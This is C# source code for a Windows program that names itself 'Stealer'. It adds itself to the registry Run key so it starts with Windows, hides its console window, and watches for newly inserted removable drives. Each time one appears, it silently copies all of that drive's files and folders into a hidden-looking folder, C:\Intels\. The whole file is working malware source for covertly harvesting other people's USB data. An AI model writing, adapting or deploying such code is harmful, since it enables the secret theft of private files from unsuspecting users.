using System;
using System.ComponentModel;
using System.Management;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Threading;
using Microsoft.Win32;
 
 
class Program
{
        /*
                CODED BY Metts - rootsite.hu
                Copy all removable flash device files, directory, when new device inserted
                Target: Win vista, Win 7
                Requires: .net 3.5
        */
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
    public static RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
    public static string drivername = "";
    public static string target = @"C:\Intels\";
    public static bool run = true;
 
    public static void Main(string[] args)
    {
        Console.Title = "Stealer";
 
        if (args.Length > 0)
        {
            switch (args[0])
            {
                case "del":
                    rkApp.DeleteValue("Stealer", false);
                    if (run) { run = false; }
                    break;
                case "write_reg":
                    rkApp.SetValue("Stealer", System.Reflection.Assembly.GetExecutingAssembly().Location);
                 break;
            }
        }
        else  rkApp.SetValue("Stealer", System.Reflection.Assembly.GetExecutingAssembly().Location);
        setConsoleWindowVisibility(false, Console.Title);
        if (run)
        {
 
            Thread thread = new Thread(new ThreadStart(check));
            thread.Start();
            Console.WriteLine("Wait...for drives...");
        }
       
    }
 
    public static void setConsoleWindowVisibility(bool visible, string title)
    {
        IntPtr hWnd = FindWindow(null, title);
        if (hWnd != IntPtr.Zero)
        {
            if (!visible)
                ShowWindow(hWnd, 0); // 0 = SW_HIDE                
            else
                ShowWindow(hWnd, 1); //1 = SW_SHOWNORMA                  
        }
    }
 
    public static void check()
    {
        while (run)
        {
            ManagementEventWatcher watcher = new ManagementEventWatcher();
            WqlEventQuery query = new WqlEventQuery("SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogicalDisk'");
            watcher.EventArrived += new EventArrivedEventHandler(watcher_EventArrived);
            watcher.Query = query;
            watcher.Start();
            watcher.WaitForNextEvent();
        }
    }
 
    public static void copyDirectory(string Src,string Dst)
    {  
        String[] Files;
 
        if(Dst[Dst.Length-1]!=Path.DirectorySeparatorChar)
            Dst+=Path.DirectorySeparatorChar;
        if(!Directory.Exists(Dst)) Directory.CreateDirectory(Dst);
            Files=Directory.GetFileSystemEntries(Src);
        foreach(string Element in Files)
        {
            Console.WriteLine(Element);
            if(Directory.Exists(Element))
                copyDirectory(Element,Dst+Path.GetFileName(Element));
            else
                File.Copy(Element,Dst+Path.GetFileName(Element),true);
        }  
    }
 
    public static List<String> GetLAllUSBDevice()
    {
        List<String> result = new List<String>();
        try
        {
            ManagementObjectCollection drives = new ManagementObjectSearcher("SELECT Caption, DeviceID FROM Win32_DiskDrive WHERE InterfaceType='USB'").Get();
            foreach (ManagementObject drive in drives)
            {
                foreach (ManagementObject partition in new ManagementObjectSearcher("ASSOCIATORS OF {Win32_DiskDrive.DeviceID='" + drive["DeviceID"] + "'} WHERE AssocClass = Win32_DiskDriveToDiskPartition").Get())
                {
                    foreach (ManagementObject disk in new ManagementObjectSearcher("ASSOCIATORS OF {Win32_DiskPartition.DeviceID='" + partition["DeviceID"] + "'} WHERE AssocClass = Win32_LogicalDiskToPartition").Get())
                    {
                        result.Add(disk["VolumeName"].ToString() + " " + disk["CAPTION"].ToString());
                    }
                }
            }
        }
        catch (Exception e)
        {
            Console.WriteLine(e.Message);
        }
        return result;
    }
 
    public static void watcher_EventArrived(object obj, EventArrivedEventArgs e)
    {
        var newEvent = e.NewEvent;
        ManagementBaseObject targetInstance = (ManagementBaseObject)newEvent.GetPropertyValue("TargetInstance");
        drivername = targetInstance.GetPropertyValue("Name").ToString();
        Console.WriteLine(drivername + " Arrived");
        copyDirectory(drivername, target);
       
    }
   
}